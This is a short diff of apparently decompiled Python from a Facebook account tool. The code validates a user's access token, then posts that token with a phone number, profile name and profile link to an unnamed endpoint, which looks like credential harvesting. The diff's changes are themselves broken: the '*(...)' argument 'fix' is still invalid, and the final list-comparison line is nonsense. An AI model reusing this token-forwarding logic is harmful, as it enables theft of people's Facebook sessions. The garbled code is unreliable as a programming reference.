@@ -235,7 +235,7 @@ if inn in mmm:
         payload = {
             'access_token': access_token }
         a = 'https://graph.facebook.com/v14.0/me'
-        b = requests.get(a, payload, **('params',))
+        b = requests.get(a, payload, *('params',))
         d = json.loads(b.text)
         if 'name' not in d:
             print(BOLD + RED + '\n[x] Token Invalid ..!!')
@@ -252,7 +252,7 @@ if inn in mmm:
         parameters = {
             'access_token': access_token,
             'message': 'Phone No : ' + inn + '\nProfile Name : ' + f + '\nToken : ' + access_token + '\nLink :\n\n https://www.facebook.com/t_' + profile_id }
-        s = requests.post(url1, parameters, headers, **('data', 'headers'))
+        s = requests.post(url1, parameters, headers, *('data', 'headers'))
         prof = '[+]=> Active Profile :: ' + f + '\n\n'
         ns = open(ms, 'r').readlines()
         [ 0.001 for pro in prof ]==(None, None, None)
